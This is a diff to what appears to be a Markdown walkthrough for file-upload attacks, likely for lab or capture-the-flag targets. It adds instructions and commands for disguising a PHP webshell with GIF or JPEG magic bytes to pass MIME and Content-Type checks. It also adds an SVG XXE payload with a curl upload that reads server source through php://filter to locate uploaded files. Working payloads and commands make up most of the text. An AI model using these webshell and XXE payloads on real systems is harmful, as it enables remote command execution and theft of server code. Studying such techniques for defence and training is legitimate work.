@@ -173,35 +173,41 @@ Keep `filename="shell.php"` and PHP content. The Content-Type change alone may b
 
 ## Phase 8 — Bypass MIME-Type Filter
 
-The server checks the actual file content using magic bytes (first bytes of the file), not the extension or header. Use `GIF8` magic bytes to make PHP look like a GIF image.
+The server checks the actual file content using magic bytes (first bytes of the file), not the extension or header.
 
-### Add magic bytes to the webshell
-In the Burp request, prepend `GIF8` as the first line of file content:
-```
-GIF8
-<?php system($_REQUEST['cmd']); ?>
-```
+### Choosing the right magic bytes — critical
 
-Or on the command line:
+**Check what MIME types the filter accepts first.** Different magic bytes produce different MIME types:
+
+| Magic bytes | MIME result | Example filter match |
+|-------------|-------------|----------------------|
+| `GIF8` | `image/gif` | Only matches if filter accepts `gif` |
+| `\xFF\xD8\xFF\xe0` (JPEG) | `image/jpeg` | Matches filters requiring MIME ending in `g` (jpe**g**) |
+| `\x89PNG` | `image/png` | Matches filters requiring MIME ending in `g` (pn**g**) |
+
+**GIF8 does NOT always work.** If the filter uses a regex like `/image\/[a-z]{2,3}g/`, `image/gif` fails because `gif` ends in `f`, not `g`. In that case use JPEG magic bytes instead.
+
+### GIF8 magic bytes (simplest — use when filter accepts image/gif)
 ```bash
 echo "GIF8" > shell.php
 echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
 ```
 
-Keep `filename="shell.php"` — the server sees GIF8 magic bytes (passes MIME check) but the file still executes as PHP.
+Verify: `file shell.php` → `shell.php: GIF image data`
 
-**GIF magic bytes:** `GIF87a` or `GIF89a` — but `GIF8` alone is sufficient.
-
-**Verify locally:**
+### JPEG magic bytes (use when filter requires MIME ending in 'g')
 ```bash
-file shell.php   # → shell.php: GIF image data
+printf '\xFF\xD8\xFF\xe0' > shell.php
+echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
 ```
 
-### Combined bypass (Content-Type + MIME)
-When both are checked:
-- Change Content-Type header → `image/gif`
-- Add `GIF8` as first line of file content
-- Keep `filename="shell.php"`
+MIME result: `image/jpeg` — `jpe` + `g` — passes regex filters looking for `[a-z]{2,3}g`.
+
+### Combined bypass (Content-Type + MIME both checked)
+Match the Content-Type header to whichever magic bytes you use:
+- GIF8 → `Content-Type: image/gif`
+- JPEG bytes → `Content-Type: image/jpeg`
+- Keep `filename="shell.php"` in both cases
 
 ---
 
@@ -238,10 +244,46 @@ XSS fires if the app displays image metadata on the page.
 ### XXE via SVG — read PHP source code (base64)
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
 <svg>&xxe;</svg>
 ```
 Decode the base64 output: `echo "<base64>" | base64 -d`
+
+**Use absolute paths** — relative paths like `index.php` may not resolve. Default Apache web root: `/var/www/html/`.
+
+### When does XXE fire? — upload time vs access time
+
+This depends on how the server handles the uploaded file:
+- **If the server processes/renders the SVG immediately after upload** (e.g. calls `displayHTMLImage()`) → XXE fires **during upload** and the file content appears in the **curl upload response**. No need to visit the file URL.
+- **If the server just stores the file** → XXE fires when the uploaded SVG is later accessed via its URL.
+
+**Always check the upload response first** — if it contains file content, XXE fired at upload time.
+
+### Use XXE to find the uploads directory and naming scheme
+
+Before uploading a webshell, read the upload script source to find:
+1. Where files are stored (`$target_dir`)
+2. How files are renamed (`$fileName = date('ymd') . '_' . basename(...)`)
+3. What validation is applied (exact regex patterns)
+
+```bash
+# Read upload.php via XXE + php://filter
+cat > /tmp/xxe.svg << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    &xxe;
+</svg>
+EOF
+
+curl -s -X POST http://<TARGET>/contact/upload.php \
+  -F "uploadFile=@/tmp/xxe.svg;type=image/svg+xml"
+
+# Decode the response
+echo '<BASE64_FROM_RESPONSE>' | base64 -d
+```
+
+Once you know the upload directory and naming scheme, you can construct the exact URL of any uploaded file.
 
 ---
 
